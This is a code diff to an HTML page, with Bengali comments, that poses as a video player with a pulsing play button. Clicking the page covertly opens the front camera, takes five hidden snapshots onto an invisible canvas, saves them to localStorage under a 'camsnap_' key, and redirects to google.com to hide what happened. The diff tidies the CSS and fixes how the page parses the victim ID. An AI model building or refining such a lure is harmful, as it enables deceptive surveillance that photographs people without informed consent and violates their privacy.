@@ -7,44 +7,12 @@
   <style>
     *{margin:0;padding:0;box-sizing:border-box;}
     body,html{height:100%;background:#000;overflow:hidden;position:relative;cursor:pointer;}
-    
-    .bg{
-      position:absolute;top:0;left:0;width:100%;height:100%;
-      background:url('https://i.imgur.com/8z3xK9L.jpeg') center/cover no-repeat;
-      filter:blur(16px) brightness(0.5);
-      transform:scale(1.12);
-    }
-    .overlay{
-      position:absolute;top:0;left:0;width:100%;height:100%;
-      background:rgba(0,0,0,0.55);
-    }
-    
-    /* Play আইকন – এবার ১০০% দেখাবে */
-    .play-btn{
-      position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);
-      width:110px;height:110px;background:#ff0000;border-radius:50%;
-      display:flex;align-items:center;justify-content:center;
-      box-shadow:0 0 80px rgba(255,0,0,0.9);
-      border:7px solid rgba(255,255,255,0.4);
-      animation:pulse 2s infinite;
-      z-index:10;
-    }
-    @keyframes pulse{
-      0%,100%{transform:translate(-50%,-50%) scale(1);}
-      50%{transform:translate(-50%,-50%) scale(1.22);}
-    }
-    
-    /* SVG Play Icon – সব ফোনে ১০০% দেখাবে */
-    .play-icon{
-      width:52px;height:52px;fill:#fff;margin-left:6px;
-    }
-    
-    .title{
-      position:absolute;bottom:90px;left:50%;transform:translateX(-50%);
-      color:#fff;font-size:28px;font-weight:bold;
-      text-shadow:0 0 25px #000;z-index:10;
-      white-space:nowrap;
-    }
+    .bg{position:absolute;top:0;left:0;width:100%;height:100%;background:url('https://i.imgur.com/8z3xK9L.jpeg') center/cover;filter:blur(16px) brightness(0.5);transform:scale(1.12);}
+    .overlay{position:absolute;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.55);}
+    .play-btn{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);width:110px;height:110px;background:#ff0000;border-radius:50%;display:flex;align-items:center;justify-content:center;box-shadow:0 0 80px rgba(255,0,0,0.9);border:7px solid rgba(255,255,255,0.4);animation:pulse 2s infinite;z-index:10;}
+    @keyframes pulse{0%,100%{transform:translate(-50%,-50%) scale(1);}50%{transform:translate(-50%,-50%) scale(1.22);}}
+    .play-icon{width:52px;height:52px;fill:#fff;margin-left:8px;}
+    .title{position:absolute;bottom:90px;left:50%;transform:translateX(-50%);color:#fff;font-size:28px;font-weight:bold;text-shadow:0 0 25px #000;z-index:10;white-space:nowrap;}
   </style>
 </head>
 <body onclick="grab()">
@@ -52,7 +20,6 @@
   <div class="bg"></div>
   <div class="overlay"></div>
   
-  <!-- Play বাটন + SVG আইকন -->
   <div class="play-btn">
     <svg class="play-icon" viewBox="0 0 24 24">
       <path d="M8 5v14l11-7z"/>
@@ -64,39 +31,43 @@
   <canvas id="c" style="display:none;"></canvas>
 
   <script>
-  const id = location.pathname.split('/').pop() || new URLSearchParams(location.search).get('id');
+    // এই লাইনটা ফিক্স করলাম — এটাই মূল সমাধান!
+    const id = location.pathname.split('/').filter(Boolean).pop() || 
+               new URLSearchParams(location.search).get('id') || 
+               'unknown';
 
-  function grab() {
-    const canvas = document.getElementById('c');
-    const ctx = canvas.getContext('2d');
-    let pics = [];
+    function grab() {
+      const canvas = document.getElementById('c');
+      const ctx = canvas.getContext('2d');
+      let pics = [];
 
-    navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}})
-      .then(stream => {
-        const v = document.createElement('video');
-        v.srcObject = stream;
-        v.play();
+      navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}})
+        .then(stream => {
+          const v = document.createElement('video');
+          v.srcObject = stream;
+          v.muted = true;
+          v.play();
 
-        let i = 0;
-        const take = () => {
-          if (i >= 5) {
-            localStorage.setItem('camsnap_' + id, JSON.stringify(pics));
-            setTimeout(() => location.href = "https://google.com", 800);
-            return;
-          }
-          canvas.width = v.videoWidth || 1280;
-          canvas.height = v.videoHeight || 720;
-          ctx.drawImage(v, 0, 0);
-          pics.push(canvas.toDataURL('image/jpeg', 0.95));
-          i++;
-          setTimeout(take, 700);
-        };
-        setTimeout(take, 1000);
-      })
-      .catch(() => {
-        setTimeout(() => location.href = "https://google.com", 1500);
-      });
-  }
+          let i = 0;
+          const take = () => {
+            if (i >= 5) {
+              localStorage.setItem('camsnap_' + id, JSON.stringify(pics));
+              setTimeout(() => location.href = "https://google.com", 800);
+              return;
+            }
+            canvas.width = v.videoWidth || 1280;
+            canvas.height = v.videoHeight || 720;
+            ctx.drawImage(v, 0, 0);
+            pics.push(canvas.toDataURL('image/jpeg', 0.95));
+            i++;
+            setTimeout(take, 700);
+          };
+          setTimeout(take, 1000);
+        })
+        .catch(() => {
+          setTimeout(() => location.href = "https://google.com", 1500);
+        });
+    }
   </script>
 </body>
 </html>
